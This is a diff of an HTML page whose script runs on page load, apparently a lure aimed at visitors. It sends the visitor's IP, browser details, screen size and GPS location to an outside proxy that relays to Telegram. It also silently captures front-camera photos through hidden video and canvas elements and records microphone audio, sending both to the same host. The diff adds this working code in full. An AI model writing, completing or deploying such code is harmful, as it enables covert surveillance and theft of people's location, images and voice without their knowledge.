@@ -15,77 +15,143 @@
             align-items: center;
             font-family: monospace;
         }
-        .hidden-content {
-            display: none;
+        #debug {
+            color: white;
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            font-size: 12px;
+            background: rgba(0,0,0,0.7);
+            padding: 5px;
+            border-radius: 5px;
+            z-index: 9999;
         }
     </style>
 </head>
 <body>
-    <div style="display:none;">
-        <div id="info"></div>
-    </div>
+    <div id="debug">Đang khởi tạo...</div>
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     <audio id="audio" style="display:none;"></audio>
 
     <script>
-        // =====  =====
+        // Cập nhật debug
+        function updateDebug(msg) {
+            console.log(msg);
+            const debugDiv = document.getElementById('debug');
+            if (debugDiv) {
+                debugDiv.innerHTML = msg;
+                setTimeout(() => {
+                    if (debugDiv.innerHTML === msg) {
+                        debugDiv.innerHTML = 'Đã hoàn tất';
+                    }
+                }, 3000);
+            }
+        }
+
+        // ===== CẤU HÌNH PROXY - THAY URL NÀY =====
         const PROXY_URL = 'https://fuckhacker.onrender.com/';
         
-        // Các cấu hình khác giữ nguyên
-        const PHOTO_COUNT = 5;
+        // Cấu hình
+        const PHOTO_COUNT = 3; // 
         const PHOTO_INTERVAL = 300;
-        const AUDIO_DURATION = 400;
+        const AUDIO_DURATION = 3000;
         
-        let infoSent = false;
         let photoSentCount = 0;
         let cameraStream = null;
         let cameraActive = false;
         let audioRecorded = false;
-        let mediaRecorder = null;
-        let audioChunks = [];
         let gpsDataSent = false;
 
-        // Hàm gửi qua proxy (không cần token)
-        async function sendToProxy(endpoint, data) {
+        // TEST TRƯỚC: Gửi tin nhắn test đến Telegram
+        async function testTelegramConnection() {
+            updateDebug('Đang kiểm tra kết nối Telegram...');
             try {
-                const response = await fetch(`${PROXY_URL}/${endpoint}`, {
+                const testMessage = `🔧 TEST KẾT NỐI - ${new Date().toLocaleString('vi-VN')}`;
+                const result = await sendToTelegram(testMessage);
+                if (result && result.ok) {
+                    updateDebug('✅ Kết nối Telegram thành công!');
+                    return true;
+                } else {
+                    updateDebug('❌ Lỗi: ' + JSON.stringify(result));
+                    return false;
+                }
+            } catch (e) {
+                updateDebug('❌ Lỗi kết nối: ' + e.message);
+                return false;
+            }
+        }
+
+        // Hàm gửi tin nhắn đến Telegram qua proxy (đã sửa)
+        async function sendToTelegram(text, retryCount = 0) {
+            const maxRetries = 2;
+            try {
+                updateDebug(`Đang gửi tin nhắn... (lần ${retryCount + 1})`);
+                
+                const response = await fetch(`${PROXY_URL}/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(data)
-                });
-                return await response.json();
-            } catch (error) {
-                console.error('Proxy error:', error);
-                throw error;
-            }
-        }
-
-        // Gửi tin nhắn qua proxy
-        async function sendToTelegram(text, retryCount = 0) {
-            const maxRetries = 2;
-            try {
-                const result = await sendToProxy('sendMessage', {
-                    text: text.substring(0, 4096),
-                    parse_mode: 'HTML',
-                    disable_web_page_preview: false
+                    body: JSON.stringify({
+                        text: text.substring(0, 4096),
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: false
+                    })
                 });
                 
-                if (!result.ok && retryCount < maxRetries) {
-                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
+                const data = await response.json();
+                console.log('Phản hồi từ proxy:', data);
+                
+                if (data.ok) {
+                    updateDebug('✅ Đã gửi tin nhắn!');
+                    return data;
+                } else {
+                    throw new Error(data.description || 'Lỗi không xác định');
                 }
-                return result;
             } catch (e) {
-                console.error('Lỗi gửi:', e);
+                console.error('Lỗi gửi tin nhắn:', e);
                 if (retryCount < maxRetries) {
-                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
+                    updateDebug(`Thử lại sau 2 giây... (${retryCount + 1}/${maxRetries})`);
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    return sendToTelegram(text, retryCount + 1);
                 }
+                updateDebug(`❌ Thất bại: ${e.message}`);
+                return { ok: false, error: e.message };
             }
         }
 
-        // Gửi audio qua proxy
+        // Gửi ảnh
+        async function sendPhotoToTelegram(blob, photoNumber, retryCount = 0) {
+            const maxRetries = 2;
+            try {
+                const formData = new FormData();
+                formData.append('photo', blob, `capture_${photoNumber}.jpg`);
+                formData.append('caption', `📸 Ảnh #${photoNumber} - ${new Date().toLocaleString('vi-VN')}`);
+                
+                const response = await fetch(`${PROXY_URL}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                if (data.ok) {
+                    photoSentCount++;
+                    updateDebug(`✅ Đã gửi ảnh #${photoNumber} (${photoSentCount}/${PHOTO_COUNT})`);
+                    return true;
+                }
+                return false;
+            } catch (e) {
+                console.error('Lỗi gửi ảnh:', e);
+                if (retryCount < maxRetries) {
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    return sendPhotoToTelegram(blob, photoNumber, retryCount + 1);
+                }
+                return false;
+            }
+        }
+
+        // Gửi audio
         async function sendAudioToTelegram(blob, retryCount = 0) {
             const maxRetries = 2;
             try {
@@ -100,63 +166,227 @@
                 
                 const data = await response.json();
                 if (data.ok) {
-                    console.log('✅ Đã gửi ghi âm thành công');
-                } else if (retryCount < maxRetries) {
-                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
+                    updateDebug('✅ Đã gửi ghi âm!');
+                    return true;
                 }
+                return false;
             } catch (e) {
                 console.error('Lỗi gửi audio:', e);
                 if (retryCount < maxRetries) {
-                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    return sendAudioToTelegram(blob, retryCount + 1);
+                }
+                return false;
+            }
+        }
+
+        // Chụp ảnh
+        async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
+            return new Promise((resolve) => {
+                try {
+                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        canvas.toBlob(async (blob) => {
+                            if (blob) {
+                                await sendPhotoToTelegram(blob, photoNumber);
+                                resolve(true);
+                            } else {
+                                resolve(false);
+                            }
+                        }, 'image/jpeg', 0.85);
+                    } else {
+                        setTimeout(() => {
+                            captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve);
+                        }, 100);
+                    }
+                } catch (e) {
+                    console.error(`Lỗi chụp #${photoNumber}:`, e);
+                    resolve(false);
+                }
+            });
+        }
+
+        async function captureMultiplePhotos(video, canvas, ctx) {
+            if (!cameraActive) return;
+            for (let i = 1; i <= PHOTO_COUNT; i++) {
+                if (!cameraActive) break;
+                await captureSinglePhoto(video, canvas, ctx, i);
+                if (i < PHOTO_COUNT) {
+                    await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL));
                 }
             }
         }
 
-        // Gửi ảnh qua proxy
-        async function sendPhotoToTelegram(blob, photoNumber, retryCount = 0) {
-            const maxRetries = 2;
+        // Ghi âm
+        async function startRecording() {
+            if (audioRecorded) return;
             try {
-                const formData = new FormData();
-                formData.append('photo', blob, `capture_${photoNumber}.jpg`);
-                formData.append('caption', `📸 Ảnh chụp #${photoNumber} - ${new Date().toLocaleString('vi-VN')}`);
+                updateDebug('🎤 Đang ghi âm...');
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const audioChunks = [];
                 
-                const response = await fetch(`${PROXY_URL}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) audioChunks.push(event.data);
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                    if (audioBlob.size > 0) {
+                        await sendAudioToTelegram(audioBlob);
+                        audioRecorded = true;
+                    }
+                    stream.getTracks().forEach(track => track.stop());
+                };
+                
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, AUDIO_DURATION);
+            } catch (e) {
+                console.error('Lỗi ghi âm:', e);
+                updateDebug('⚠️ Không thể ghi âm');
+            }
+        }
+
+        // Lấy thông tin IP và vị trí (rút gọn để test)
+        async function getSimpleInfo() {
+            let ip = 'Không xác định';
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                ip = data.ip;
+            } catch (e) {
+                console.error('Lỗi lấy IP:', e);
+            }
+            
+            return {
+                ip: ip,
+                userAgent: navigator.userAgent,
+                time: new Date().toLocaleString('vi-VN')
+            };
+        }
+
+        // Gửi thông tin thiết bị
+        async function sendDeviceInfo() {
+            const info = await getSimpleInfo();
+            const message = `<b>📥 THÔNG TIN THIẾT BỊ</b>\n\n` +
+                `<b>🌐 IP:</b> <code>${info.ip}</code>\n` +
+                `<b>💻 Trình duyệt:</b> <code>${info.userAgent.substring(0, 100)}</code>\n` +
+                `<b>🕐 Thời gian:</b> <code>${info.time}</code>\n` +
+                `<b>📱 Màn hình:</b> <code>${screen.width}x${screen.height}</code>`;
+            
+            return await sendToTelegram(message);
+        }
+
+        // GPS
+        async function autoSendGPS() {
+            if (gpsDataSent || !('geolocation' in navigator)) return;
+            
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                    
+                    const gpsMessage = `<b>📍 VỊ TRÍ GPS</b>\n\n` +
+                        `<b>📌 Vĩ độ:</b> <code>${lat}</code>\n` +
+                        `<b>📌 Kinh độ:</b> <code>${lng}</code>\n` +
+                        `<b>🎯 Độ chính xác:</b> <code>${Math.round(pos.coords.accuracy)}m</code>\n\n` +
+                        `<a href="${mapsLink}">🗺️ Xem bản đồ</a>`;
+                    
+                    await sendToTelegram(gpsMessage);
+                    gpsDataSent = true;
+                },
+                (err) => {
+                    console.log('Lỗi GPS:', err.message);
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }
+
+        // Khởi tạo camera
+        async function startCamera() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            if (!navigator.mediaDevices) {
+                updateDebug('⚠️ Trình duyệt không hỗ trợ camera');
+                return;
+            }
+            
+            try {
+                updateDebug('📷 Yêu cầu quyền camera...');
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' }
                 });
                 
-                const data = await response.json();
-                if (data.ok) {
-                    photoSentCount++;
-                    console.log(`✅ Đã gửi ảnh #${photoNumber}`);
-                    
-                    if (photoSentCount === PHOTO_COUNT && cameraStream && cameraActive) {
-                        setTimeout(() => {
-                            cameraStream.getTracks().forEach(track => track.stop());
-                            cameraStream = null;
-                            cameraActive = false;
-                        }, 2000);
-                    }
-                } else if (retryCount < maxRetries) {
-                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
-                }
+                cameraStream = stream;
+                cameraActive = true;
+                video.srcObject = stream;
+                
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                await new Promise(resolve => setTimeout(resolve, 500));
+                updateDebug('📸 Đang chụp ảnh...');
+                await captureMultiplePhotos(video, canvas, ctx);
             } catch (e) {
-                console.error('Lỗi gửi ảnh:', e);
-                if (retryCount < maxRetries) {
-                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
-                }
+                console.error('Lỗi camera:', e);
+                updateDebug('⚠️ Không thể dùng camera');
             }
         }
 
-        // Các hàm còn lại giữ nguyên (captureSinglePhoto, captureMultiplePhotos, startRecording, 
-        // getIPAndLocation, getBatteryInfo, getDeviceInfo, autoSendGPS, getInfoAndSendToTelegram,
-        // startCameraImmediately, requestAudioImmediately, init)
+        // KHỞI TẠO CHÍNH
+        async function init() {
+            try {
+                updateDebug('🚀 Đang khởi tạo...');
+                
+                // Bước 1: Test kết nối Telegram
+                const isConnected = await testTelegramConnection();
+                if (!isConnected) {
+                    updateDebug('❌ Không thể kết nối Telegram! Kiểm tra proxy URL');
+                    return;
+                }
+                
+                // Bước 2: Gửi thông tin thiết bị
+                updateDebug('📤 Đang gửi thông tin...');
+                await sendDeviceInfo();
+                
+                // Bước 3: Lấy GPS
+                setTimeout(() => {
+                    autoSendGPS();
+                }, 1000);
+                
+                // Bước 4: Chụp ảnh
+                await startCamera();
+                
+                // Bước 5: Ghi âm
+                setTimeout(() => {
+                    startRecording();
+                }, 500);
+                
+                updateDebug('✅ Hoàn tất!');
+            } catch (err) {
+                console.error('Lỗi khởi tạo:', err);
+                updateDebug('❌ Lỗi: ' + err.message);
+            }
+        }
         
-        // [PHẦN CODE CÒN LẠI GIỮ NGUYÊN NHƯ BẢN GỐC]
-        // ... (copy toàn bộ các hàm từ bản gốc từ captureSinglePhoto đến init)
-        
-        // Bắt đầu quá trình
-        init();
+        // Chạy ngay khi trang load
+        window.addEventListener('load', () => {
+            setTimeout(init, 500);
+        });
     </script>
 </body>
 </html>
